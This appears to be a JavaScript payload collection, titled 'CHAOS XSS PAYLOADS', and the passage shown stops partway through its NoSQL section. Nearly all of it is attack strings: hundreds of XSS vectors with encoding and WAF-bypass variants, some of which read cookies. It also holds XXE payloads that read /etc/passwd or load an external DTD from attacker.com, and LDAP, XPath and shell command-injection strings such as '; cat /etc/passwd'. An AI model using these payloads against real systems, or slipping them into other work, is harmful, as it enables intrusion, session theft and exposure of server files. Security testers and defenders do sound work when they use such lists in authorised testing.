// CHAOS XSS PAYLOADS v666.1 - MEGA DATABASE

const XSS_PAYLOADS = {
    basic: {
        script: [
            '<script>alert("XSS")</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(document.cookie)</script>',
            '<script>alert(window.location)</script>',
            '<script>alert(navigator.userAgent)</script>',
            '<script>confirm("XSS")</script>',
            '<script>prompt("XSS")</script>',
            '<script>eval("alert(\'XSS\')")</script>',
            '<script>Function("alert(\'XSS\')")()</script>',
            '<script>setTimeout("alert(\'XSS\')", 0)</script>',
            '<script>setInterval("alert(\'XSS\')", 1000)</script>',
            '<script>window["alert"]("XSS")</script>',
            '<script>window["al"+"ert"]("XSS")</script>',
            '<script>top.alert("XSS")</script>',
            '<script>parent.alert("XSS")</script>',
            '<script>frames[0].alert("XSS")</script>',
            '<script>self.alert("XSS")</script>'
        ],
        
        img: [
            '<img src=x onerror=alert("XSS")>',
            '<img src=# onerror=alert("XSS")>',
            '<img src="x" onerror=alert("XSS")>',
            '<img src=\'x\' onerror=alert("XSS")>',
            '<img src=x onerror=alert(document.cookie)>',
            '<img src=x onerror=alert(document.domain)>',
            '<img src=x onerror=eval("alert(\'XSS\')")>',
            '<img src=x onerror=Function("alert(\'XSS\')")()>',
            '<img src=x onerror=setTimeout("alert(\'XSS\')", 0)>',
            '<img src=x onerror=window["alert"]("XSS")>',
            '<img src=x onerror=confirm("XSS")>',
            '<img src=x onerror=prompt("XSS")>',
            '<img src=x onerror=eval(atob("YWxlcnQoIlhTUyIp"))>',
            '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))>'
        ],
        
        svg: [
            '<svg onload=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS\')"/>',
            '<svg onload=alert(document.cookie)>',
            '<svg onload=alert(document.domain)>',
            '<svg><script>alert("XSS")</script></svg>',
            '<svg><script href="javascript:alert(\'XSS\')" />',
            '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
            '<svg><animate onend=alert("XSS") attributeName=x dur=1s>',
            '<svg><set onbegin=alert("XSS") attributeName=x>',
            '<svg><set onend=alert("XSS") attributeName=x>',
            '<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>',
            '<svg><image href="javascript:alert(\'XSS\')">',
            '<svg><use href="javascript:alert(\'XSS\')">',
            '<svg><use xlink:href="javascript:alert(\'XSS\')">'
        ],
        
        iframe: [
            '<iframe src="javascript:alert(\'XSS\')">',
            '<iframe src="javascript:alert(document.cookie)">',
            '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
            '<iframe onload=alert("XSS")>',
            '<iframe onerror=alert("XSS")>',
            '<iframe src="about:blank" onload="alert(\'XSS\')">',
            '<iframe src="javascript:eval(name)">',
            '<iframe src="javascript:eval(location.hash.slice(1))">',
            '<iframe srcdoc="<script>alert(\'XSS\')</script>">',
            '<iframe src="data:image/svg+xml,<svg onload=alert(\'XSS\')>">',
            '<iframe src="vbscript:MsgBox(\'XSS\')">',
            '<iframe src="mhtml:http://attacker.com/xss.mht!xss.html">'
        ],
        
        input: [
            '<input onfocus=alert("XSS") autofocus>',
            '<input onblur=alert("XSS")>',
            '<input onchange=alert("XSS")>',
            '<input onselect=alert("XSS")>',
            '<input onclick=alert("XSS")>',
            '<input ondblclick=alert("XSS")>',
            '<input onmousedown=alert("XSS")>',
            '<input onmouseup=alert("XSS")>',
            '<input onmouseover=alert("XSS")>',
            '<input onmouseout=alert("XSS")>',
            '<input onmousemove=alert("XSS")>',
            '<input onkeydown=alert("XSS")>',
            '<input onkeyup=alert("XSS")>',
            '<input onkeypress=alert("XSS")>'
        ],
        
        body: [
            '<body onload=alert("XSS")>',
            '<body onunload=alert("XSS")>',
            '<body onfocus=alert("XSS")>',
            '<body onblur=alert("XSS")>',
            '<body onclick=alert("XSS")>',
            '<body ondblclick=alert("XSS")>',
            '<body onmousedown=alert("XSS")>',
            '<body onmouseup=alert("XSS")>',
            '<body onmouseover=alert("XSS")>',
            '<body onmouseout=alert("XSS")>',
            '<body onmousemove=alert("XSS")>',
            '<body onkeydown=alert("XSS")>',
            '<body onkeyup=alert("XSS")>',
            '<body onkeypress=alert("XSS")>',
            '<body onbeforeprint=alert("XSS")>',
            '<body onafterprint=alert("XSS")>'
        ],
        
        div: [
            '<div onmouseover=alert("XSS")>',
            '<div onclick=alert("XSS")>',
            '<div onmouseenter=alert("XSS")>',
            '<div onmouseleave=alert("XSS")>',
            '<div onmousedown=alert("XSS")>',
            '<div onmouseup=alert("XSS")>',
            '<div onmousemove=alert("XSS")>',
            '<div ondblclick=alert("XSS")>',
            '<div oncontextmenu=alert("XSS")>',
            '<div onwheel=alert("XSS")>',
            '<div onscroll=alert("XSS")>',
            '<div onfocus=alert("XSS")>',
            '<div onblur=alert("XSS")>',
            '<div ondragstart=alert("XSS")>',
            '<div ondrop=alert("XSS")>'
        ],
        
        link: [
            '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
            '<link rel="icon" href="javascript:alert(\'XSS\')">',
            '<link rel="canonical" href="javascript:alert(\'XSS\')">',
            '<link rel="alternate" href="javascript:alert(\'XSS\')">',
            '<link rel="next" href="javascript:alert(\'XSS\')">',
            '<link rel="prev" href="javascript:alert(\'XSS\')">',
            '<link rel="shortcut icon" href="javascript:alert(\'XSS\')">',
            '<link rel="apple-touch-icon" href="javascript:alert(\'XSS\')">'
        ],
        
        meta: [
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
            '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(\'XSS\')</script>">',
            '<meta name="referrer" content="javascript:alert(\'XSS\')">',
            '<meta property="og:url" content="javascript:alert(\'XSS\')">',
            '<meta property="og:image" content="javascript:alert(\'XSS\')">',
            '<meta name="twitter:image" content="javascript:alert(\'XSS\')">',
            '<meta itemprop="image" content="javascript:alert(\'XSS\')">'
        ],
        
        object: [
            '<object data="javascript:alert(\'XSS\')">',
            '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
            '<object onerror=alert("XSS")>',
            '<object onload=alert("XSS")>',
            '<object type="text/html" data="javascript:alert(\'XSS\')">',
            '<object codebase="javascript:alert(\'XSS\')">',
            '<object classid="javascript:alert(\'XSS\')">',
            '<object archive="javascript:alert(\'XSS\')">'
        ],
        
        embed: [
            '<embed src="javascript:alert(\'XSS\')">',
            '<embed src="data:text/html,<script>alert(\'XSS\')</script>">',
            '<embed onerror=alert("XSS")>',
            '<embed onload=alert("XSS")>',
            '<embed type="text/html" src="javascript:alert(\'XSS\')">',
            '<embed src="vbscript:MsgBox(\'XSS\')">',
            '<embed src="mhtml:http://attacker.com/xss.mht!xss.html">'
        ],
        
        form: [
            '<form action="javascript:alert(\'XSS\')"><input type="submit">',
            '<form><button formaction="javascript:alert(\'XSS\')">Click</button></form>',
            '<form onsubmit=alert("XSS")><input type="submit">',
            '<form onreset=alert("XSS")><input type="reset">',
            '<form oninput=alert("XSS")><input></form>',
            '<form onchange=alert("XSS")><input></form>',
            '<form onformdata=alert("XSS")><input name="x" value="x"></form>'
        ],
        
        button: [
            '<button onclick=alert("XSS")>Click me</button>',
            '<button onmouseover=alert("XSS")>Hover me</button>',
            '<button onfocus=alert("XSS") autofocus>Focus me</button>',
            '<button ondblclick=alert("XSS")>Double click me</button>',
            '<button onmousedown=alert("XSS")>Mouse down</button>',
            '<button onmouseup=alert("XSS")>Mouse up</button>',
            '<button onmouseenter=alert("XSS")>Mouse enter</button>',
            '<button onmouseleave=alert("XSS")>Mouse leave</button>'
        ],
        
        a: [
            '<a href="javascript:alert(\'XSS\')">Click me</a>',
            '<a href="javascript:alert(document.cookie)">Click me</a>',
            '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click me</a>',
            '<a href="vbscript:MsgBox(\'XSS\')">Click me</a>',
            '<a onclick=alert("XSS") href="#">Click me</a>',
            '<a onmouseover=alert("XSS") href="#">Hover me</a>',
            '<a onfocus=alert("XSS") href="#">Focus me</a>'
        ],
        
        img_event: [
            '<img src=x onerror=alert("XSS")>',
            '<img src=x onload=alert("XSS")>',
            '<img src=x onabort=alert("XSS")>',
            '<img src=x onmouseover=alert("XSS")>',
            '<img src=x onmouseout=alert("XSS")>',
            '<img src=x onmousedown=alert("XSS")>',
            '<img src=x onmouseup=alert("XSS")>',
            '<img src=x onmousemove=alert("XSS")>',
            '<img src=x onclick=alert("XSS")>',
            '<img src=x ondblclick=alert("XSS")>',
            '<img src=x oncontextmenu=alert("XSS")>',
            '<img src=x onwheel=alert("XSS")>'
        ],
        
        marquee: [
            '<marquee onstart=alert("XSS")>XSS</marquee>',
            '<marquee onfinish=alert("XSS")>XSS</marquee>',
            '<marquee onbounce=alert("XSS")>XSS</marquee>',
            '<marquee behavior="alternate" onstart=alert("XSS")>XSS</marquee>',
            '<marquee direction="left" onstart=alert("XSS")>XSS</marquee>',
            '<marquee loop="1" onfinish=alert("XSS")>XSS</marquee>',
            '<marquee scrollamount="10" onstart=alert("XSS")>XSS</marquee>'
        ],
        
        details: [
            '<details/open/ontoggle=alert("XSS")>',
            '<details ontoggle=alert("XSS")><summary>Click me</summary></details>',
            '<details ontoggle=alert(document.cookie)><summary>Click me</summary></details>',
            '<details ontoggle=eval("alert(\'XSS\')")><summary>Click me</summary></details>',
            '<details ontoggle=confirm("XSS")><summary>Click me</summary></details>',
            '<details ontoggle=prompt("XSS")><summary>Click me</summary></details>'
        ],
        
        meter: [
            '<meter/onmouseover=alert("XSS")>0</meter>',
            '<meter onclick=alert("XSS")>0</meter>',
            '<meter onfocus=alert("XSS") autofocus>0</meter>',
            '<meter onmousedown=alert("XSS")>0</meter>',
            '<meter onmouseup=alert("XSS")>0</meter>',
            '<meter onmouseenter=alert("XSS")>0</meter>',
            '<meter onmouseleave=alert("XSS")>0</meter>',
            '<meter ondblclick=alert("XSS")>0</meter>'
        ],
        
        progress: [
            '<progress/onmouseover=alert("XSS") value=0>',
            '<progress onclick=alert("XSS") value=0>',
            '<progress onfocus=alert("XSS") autofocus value=0>',
            '<progress onmousedown=alert("XSS") value=0>',
            '<progress onmouseup=alert("XSS") value=0>',
            '<progress onmouseenter=alert("XSS") value=0>',
            '<progress onmouseleave=alert("XSS") value=0>',
            '<progress ondblclick=alert("XSS") value=0>'
        ],
        
        audio_video: [
            '<video src=x onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            '<source onerror=alert("XSS")>',
            '<track onerror=alert("XSS")>',
            '<video onloadstart=alert("XSS")>',
            '<audio onloadstart=alert("XSS")>',
            '<video onloadeddata=alert("XSS")>',
            '<audio onloadeddata=alert("XSS")>',
            '<video onended=alert("XSS")>',
            '<audio onended=alert("XSS")>',
            '<video onplay=alert("XSS")>',
            '<audio onplay=alert("XSS")>'
        ],
        
        mathml: [
            '<math><mtext></mtext><mtext><script>alert("XSS")</script></mtext></math>',
            '<math><mtext><img src=x onerror=alert("XSS")></mtext></math>',
            '<math><mtext><svg onload=alert("XSS")></mtext></math>',
            '<math><mtext><iframe src="javascript:alert(\'XSS\')"></mtext></math>',
            '<math><mtext><embed src="javascript:alert(\'XSS\')"></mtext></math>',
            '<math><mtext><object data="javascript:alert(\'XSS\')"></mtext></math>'
        ],
        
        css: [
            '<style>@import"javascript:alert(\'XSS\')"</style>',
            '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
            '<style>*{color:expression(alert("XSS"))}</style>',
            '<div style="background:url(\'javascript:alert("XSS")\')">',
            '<div style="list-style:url(\'javascript:alert("XSS")\')">',
            '<div style="content:url(\'javascript:alert("XSS")\')">',
            '<div style="cursor:url(\'javascript:alert("XSS")\')">',
            '<div style="xss:expression(alert("XSS"))">',
            '<div style="width:expression(alert("XSS"))">',
            '<div style="height:expression(alert("XSS"))">'
        ],
        
        data_uri: [
            'data:text/html,<script>alert("XSS")</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
            'data:image/svg+xml,<svg onload=alert("XSS")>',
            'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoIlhTUyIpPg==',
            'data:application/javascript,alert("XSS")',
            'data:text/vbscript,MsgBox("XSS")',
            'data:text/html,<img src=x onerror=alert("XSS")>',
            'data:text/html,<iframe src="javascript:alert(\'XSS\')">'
        ],
        
        javascript_uri: [
            'javascript:alert("XSS")',
            'javascript:alert(document.cookie)',
            'javascript:alert(document.domain)',
            'javascript:eval("alert(\'XSS\')")',
            'javascript:Function("alert(\'XSS\')")()',
            'javascript:String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)',
            'javascript:window["alert"]("XSS")',
            'javascript:window["al"+"ert"]("XSS")',
            'javascript:top.alert("XSS")',
            'javascript:parent.alert("XSS")',
            'javascript:self.alert("XSS")',
            'javascript:frames[0].alert("XSS")'
        ],
        
        vbscript: [
            '<script language="vbscript">MsgBox("XSS")</script>',
            '<script type="text/vbscript">MsgBox("XSS")</script>',
            '<input onmouseover="MsgBox(\'XSS\')" style="vbscript:MsgBox(\'XSS\')">',
            '<a href="vbscript:MsgBox(\'XSS\')">Click me</a>',
            '<div style="behavior:url(#default#clientCaps)" onreadystatechange="MsgBox(\'XSS\')"></div>'
        ],
        
        expression: [
            '<div style="xss:expression(alert(\'XSS\'))">',
            '<div style="background:expression(alert(\'XSS\'))">',
            '<div style="width:expression(alert(\'XSS\'))">',
            '<div style="height:expression(alert(\'XSS\'))">',
            '<div style="color:expression(alert(\'XSS\'))">',
            '<div style="font-size:expression(alert(\'XSS\'))">',
            '<div style="border:expression(alert(\'XSS\'))">',
            '<div style="margin:expression(alert(\'XSS\'))">',
            '<div style="padding:expression(alert(\'XSS\'))">',
            '<div style="list-style:expression(alert(\'XSS\'))">'
        ],
        
        meta_refresh: [
            '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
            '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(\'XSS\')</script>">',
            '<meta http-equiv="refresh" content="0;url=vbscript:MsgBox(\'XSS\')">',
            '<meta http-equiv="refresh" content="0;url=mhtml:http://attacker.com/xss.mht!xss.html">',
            '<meta http-equiv="refresh" content="0;url=expect://id">'
        ],
        
        polyglot: [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
            '\'"--><script>alert("XSS")</script>',
            '\'"--><img src=x onerror=alert("XSS")>',
            'javascript://\'"/title></style></textarea></script><img src=x onerror=alert("XSS")>',
            '\'</style></script><script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '\'><script>alert("XSS")</script>',
            'javascript:alert("XSS")//',
            '"><img src=x onerror=alert("XSS")>',
            '\'><img src=x onerror=alert("XSS")>'
        ]
    },
    
    advanced: {
        event_handlers: [
            'onload=alert("XSS")',
            'onerror=alert("XSS")',
            'onfocus=alert("XSS")',
            'onblur=alert("XSS")',
            'onchange=alert("XSS")',
            'onselect=alert("XSS")',
            'onsubmit=alert("XSS")',
            'onreset=alert("XSS")',
            'onclick=alert("XSS")',
            'ondblclick=alert("XSS")',
            'onmousedown=alert("XSS")',
            'onmouseup=alert("XSS")',
            'onmouseover=alert("XSS")',
            'onmouseout=alert("XSS")',
            'onmousemove=alert("XSS")',
            'onkeydown=alert("XSS")',
            'onkeyup=alert("XSS")',
            'onkeypress=alert("XSS")',
            'oncontextmenu=alert("XSS")',
            'onwheel=alert("XSS")',
            'onscroll=alert("XSS")',
            'oncopy=alert("XSS")',
            'oncut=alert("XSS")',
            'onpaste=alert("XSS")',
            'ondragstart=alert("XSS")',
            'ondrop=alert("XSS")',
            'onbeforeprint=alert("XSS")',
            'onafterprint=alert("XSS")',
            'ononline=alert("XSS")',
            'onoffline=alert("XSS")',
            'onhashchange=alert("XSS")',
            'onstorage=alert("XSS")',
            'onpopstate=alert("XSS")',
            'onpageshow=alert("XSS")',
            'onpagehide=alert("XSS")',
            'onbeforeunload=alert("XSS")',
            'onunload=alert("XSS")'
        ],
        
        encoding_bypass: [
            '<scr\u0131pt>alert("XSS")</scr\u0131pt>',
            '<img src=x onerror=\u0061lert("XSS")>',
            '<svg onload=\u0061lert("XSS")>',
            '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;',
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            '&lt;img src=x onerror=alert("XSS")&gt;',
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<ImG src=x onerror=alert("XSS")>',
            '<SvG onload=alert("XSS")>',
            '<scr\x00ipt>alert("XSS")</scr\x00ipt>',
            '<scr<!--test-->ipt>alert("XSS")</scr<!--test-->ipt>',
            '<img src=x onerror="alert(/*XSS*/\'XSS\')">',
            '<svg onload=alert(/XSS/.source)>',
            '<img src=x onerror=alert("XSS".replace("XSS", "XSS"))>',
            '<script>alert(document["cookie"])</script>',
            '<img src=x onerror=alert(document["cookie"])>',
            '<img src=x onerror=alert`XSS`>',
            '<img src=x onerror=alert(/**/\'XSS\'/**/)>',
            'JaVaScRiPt:alert("XSS")',
            'vbscript:MsgBox("XSS")'
        ],
        
        waf_bypass: [
            '<svg/onload=alert("XSS")>',
            '<img src=x onerror=alert/*XSS*/("XSS")>',
            '<img src=x onerror=alert("XSS".replace("XSS", "XSS"))>',
            '<script>alert(document["cookie"])</script>',
            '<img src=x onerror=alert(document["cookie"])>',
            '<svg onload=alert(/XSS/.source)>',
            '<iframe src="jav&#x0A;ascript:alert(\'XSS\')">',
            '<embed src="jav&#x09;ascript:alert(\'XSS\')">',
            '<img src=x onerror=alert`XSS`>',
            '<img src=x onerror=alert(/**/\'XSS\'/**/)>',
            '<script>alert(document.cookie)//</script>',
            '<img src=x onerror=alert(document.cookie)//>',
            '<svg onload=alert(document.cookie)//>',
            '<iframe src="javascript:alert(document.cookie)//">',
            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
            '<svg onload=alert(String.fromCharCode(88,83,83))>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=window["alert"]("XSS")>',
            '<svg onload=window["alert"]("XSS")>',
            '<script>window["alert"]("XSS")</script>'
        ],
        
        html5_new: [
            '<video src=x onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            '<source onerror=alert("XSS")>',
            '<track onerror=alert("XSS")>',
            '<details/open/ontoggle=alert("XSS")>',
            '<meter/onmouseover=alert("XSS")>0</meter>',
            '<progress/onmouseover=alert("XSS") value=0>',
            '<datalist/onmouseover=alert("XSS")></datalist>',
            '<keygen/onfocus=alert("XSS") autofocus>',
            '<output/onmouseover=alert("XSS")>0</output>',
            '<dialog/open/onclose=alert("XSS")></dialog>',
            '<menu/onmouseover=alert("XSS")></menu>',
            '<command/onmouseover=alert("XSS")></command>',
            '<article/onmouseover=alert("XSS")></article>',
            '<section/onmouseover=alert("XSS")></section>',
            '<aside/onmouseover=alert("XSS")></aside>',
            '<header/onmouseover=alert("XSS")></header>',
            '<footer/onmouseover=alert("XSS")></footer>',
            '<nav/onmouseover=alert("XSS")></nav>',
            '<figure/onmouseover=alert("XSS")></figure>',
            '<figcaption/onmouseover=alert("XSS")></figcaption>',
            '<mark/onmouseover=alert("XSS")>XSS</mark>',
            '<time/onmouseover=alert("XSS")>XSS</time>'
        ],
        
        mutation: [
            '<div id="xss"><img src=x onerror=alert("XSS")></div><script>document.getElementById("xss").innerHTML = "<img src=x onerror=alert(\'XSS\')>"</script>',
            '<div id="xss"></div><script>document.getElementById("xss").outerHTML = "<img src=x onerror=alert(\'XSS\')>"</script>',
            '<div id="xss"></div><script>document.getElementById("xss").insertAdjacentHTML("beforebegin", "<img src=x onerror=alert(\'XSS\')>")</script>',
            '<div id="xss"></div><script>setTimeout(function(){document.getElementById("xss").innerHTML = "<img src=x onerror=alert(\'XSS\')>"}, 1000)</script>',
            '<div id="xss"></div><script>setInterval(function(){document.getElementById("xss").innerHTML = "<img src=x onerror=alert(\'XSS\')>"}, 1000)</script>',
            '<div id="xss"></div><script>document.write("<img src=x onerror=alert(\'XSS\')>")</script>',
            '<div id="xss"></div><script>document.writeln("<img src=x onerror=alert(\'XSS\')>")</script>',
            '<div id="xss"></div><script>document.open(); document.write("<img src=x onerror=alert(\'XSS\')>"); document.close();</script>',
            '<div id="xss"></div><script>document.body.appendChild(document.createElement("img")).src = "x"; document.body.lastChild.onerror = alert;</script>',
            '<div id="xss"></div><script>document.body.innerHTML += "<img src=x onerror=alert(\'XSS\')>";</script>'
        ],
        
        javascript_mixed: [
            'javascript:alert("XSS")',
            'javascript:alert(document.cookie)',
            'javascript:alert(document.domain)',
            'javascript:eval("alert(\'XSS\')")',
            'javascript:Function("alert(\'XSS\')")()',
            'javascript:setTimeout("alert(\'XSS\')", 0)',
            'javascript:String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)',
            'javascript:window["alert"]("XSS")',
            'javascript:window["al"+"ert"]("XSS")',
            'javascript:top.alert("XSS")',
            'javascript:parent.alert("XSS")',
            'javascript:frames[0].alert("XSS")',
            'javascript:self.alert("XSS")',
            'javascript:alert`XSS`',
            'javascript:alert(/**/\'XSS\'/**/)',
            'javascript:alert(/XSS/.source)',
            'javascript:alert(String.fromCharCode(88,83,83))',
            'javascript:eval(atob("YWxlcnQoIlhTUyIp"))',
            'javascript:eval(location.hash.slice(1))'
        ],
        
        protocol_handler: [
            'vbscript:MsgBox("XSS")',
            'vbscript:Execute("MsgBox ""XSS""")',
            'vbscript:eval("MsgBox ""XSS""")',
            'livescript:alert("XSS")',
            'mocha:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
            'data:application/javascript,alert("XSS")',
            'data:text/vbscript,MsgBox("XSS")',
            'data:image/svg+xml,<svg onload=alert("XSS")>',
            'data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoIlhTUyIpPg==',
            'mhtml:http://attacker.com/xss.mht!xss.html',
            'expect://id',
            'ms-help://#',
            'shell:AppsFolder\\Microsoft.Spartan_pvw19hy3w0nj6!Spartan'
        ],
        
        svg_advanced: [
            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS\')"/>',
            '<svg onload=alert(document.cookie)>',
            '<svg onload=alert(document.domain)>',
            '<svg><script>alert("XSS")</script></svg>',
            '<svg><script href="javascript:alert(\'XSS\')" />',
            '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
            '<svg><animate onend=alert("XSS") attributeName=x dur=1s>',
            '<svg><set onbegin=alert("XSS") attributeName=x>',
            '<svg><set onend=alert("XSS") attributeName=x>',
            '<svg><foreignObject><script>alert("XSS")</script></foreignObject></svg>',
            '<svg><foreignObject><img src=x onerror=alert("XSS")></foreignObject></svg>',
            '<svg><image href="javascript:alert(\'XSS\')">',
            '<svg><image src="javascript:alert(\'XSS\')">',
            '<svg><feImage href="javascript:alert(\'XSS\')">',
            '<svg><use href="javascript:alert(\'XSS\')">',
            '<svg><use xlink:href="javascript:alert(\'XSS\')">',
            '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(\'XSS\')"><rect width="100" height="100" /></a></svg>',
            '<svg><script type="text/ecmascript">alert("XSS")</script></svg>',
            '<svg><script type="application/javascript">alert("XSS")</script></svg>',
            '<svg><script href="data:text/javascript,alert(\'XSS\')" />'
        ],
        
        mathml_advanced: [
            '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><script>alert("XSS")</script></mtext></math>',
            '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><img src=x onerror=alert("XSS")></mtext></math>',
            '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><svg onload=alert("XSS")></mtext></math>',
            '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><iframe src="javascript:alert(\'XSS\')"></mtext></math>',
            '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><embed src="javascript:alert(\'XSS\')"></mtext></math>',
            '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><object data="javascript:alert(\'XSS\')"></mtext></math>',
            '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><a href="javascript:alert(\'XSS\')">XSS</a></mtext></math>',
            '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><input onfocus=alert("XSS") autofocus></mtext></math>',
            '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><button onclick=alert("XSS")>XSS</button></mtext></math>',
            '<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><marquee onstart=alert("XSS")>XSS</marquee></mtext></math>'
        ],
        
        xml_advanced: [
            '<?xml version="1.0"?><root><xss><![CDATA[<script>alert("XSS")</script>]]></xss></root>',
            '<?xml version="1.0"?><root><xss>&lt;script&gt;alert("XSS")&lt;/script&gt;</xss></root>',
            '<?xml version="1.0"?><root xmlns:js="javascript:alert(\'XSS\')"><js:tag/></root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xss SYSTEM "javascript:alert(\'XSS\')">]><root>&xss;</root>',
            '<xml><script>alert("XSS")</script></xml>',
            '<xml><xss><![CDATA[<img src=x onerror=alert("XSS")>]]></xss></xml>',
            '<?xml-stylesheet type="text/xsl" href="javascript:alert(\'XSS\')"?>',
            '<?xml version="1.0"?><?xml-stylesheet type="text/css" href="javascript:alert(\'XSS\')"?>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        ],
        
        flash: [
            '<embed src="xss.swf" allowscriptaccess="always">',
            '<object data="xss.swf" allowscriptaccess="always">',
            '<embed src="javascript:alert(\'XSS\')" allowscriptaccess="always">',
            '<object data="javascript:alert(\'XSS\')" allowscriptaccess="always">',
            '<param name="movie" value="javascript:alert(\'XSS\')">',
            '<param name="src" value="javascript:alert(\'XSS\')">',
            '<param name="href" value="javascript:alert(\'XSS\')">',
            '<param name="url" value="javascript:alert(\'XSS\')">',
            '<param name="uri" value="javascript:alert(\'XSS\')">',
            '<param name="link" value="javascript:alert(\'XSS\')">',
            '<embed src="data:text/html,<script>alert(\'XSS\')</script>" allowscriptaccess="always">',
            '<object data="data:text/html,<script>alert(\'XSS\')</script>" allowscriptaccess="always">'
        ],
        
        xslt: [
            '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="javascript:alert(\'XSS\')"?>',
            '<?xml version="1.0"?><?xml-stylesheet type="text/css" href="javascript:alert(\'XSS\')"?>',
            '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><script>alert("XSS")</script></xsl:template></xsl:stylesheet>',
            '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:js="javascript:alert(\'XSS\')"><xsl:template match="/"><js:tag/></xsl:template></xsl:stylesheet>'
        ],
        
        xxe: [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://attacker.com/file">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY xxe "%xxe;">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"><!ENTITY % evil "<!ENTITY xxe SYSTEM \'file:///etc/passwd\'>">%evil;%xxe;]><foo>&xxe;</foo>'
        ],
        
        ldap_injection: [
            'admin)(|(userPassword=x)',
            'admin))(|(objectClass=*))',
            'admin)(&(userPassword=x))',
            '*)(uid=*',
            'admin)(|(userPassword=*))',
            'admin)(|(uid=*))',
            'admin)(|(cn=*))',
            'admin)(|(mail=*))',
            'admin)(|(objectClass=*))',
            'admin)(|(description=*))'
        ],
        
        xpath_injection: [
            '\' or \'1\'=\'1',
            '\' or \'1\'=\'1\' or \'\'=\'',
            '\' or 1=1 or \'\'=\'',
            '\' or \'a\'=\'a',
            '\' or \'x\'=\'x\' or \'x\'=\'',
            '//user[password=\'\' or \'1\'=\'1\']',
            '//user[username=\'admin\' or \'1\'=\'1\']',
            '//user[email=\'\' or contains(.,\'@\')]',
            '//user[password=\'\' or contains(.,\'a\')]',
            '//user[username=\'\' or string-length(password)>0]'
        ],
        
        command_injection: [
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            '; id',
            '| id',
            '`id`',
            '$(id)',
            '; whoami',
            '| whoami',
            '`whoami`',
            '$(whoami)',
            '; ls -la',
            '| ls -la',
            '`ls -la`',
            '$(ls -la)',
            '; pwd',
            '| pwd',
            '`pwd`',
            '$(pwd)'
        ],
        
        nosql_injection: [
            '{"$ne": null}',
            '{"$gt": ""}',
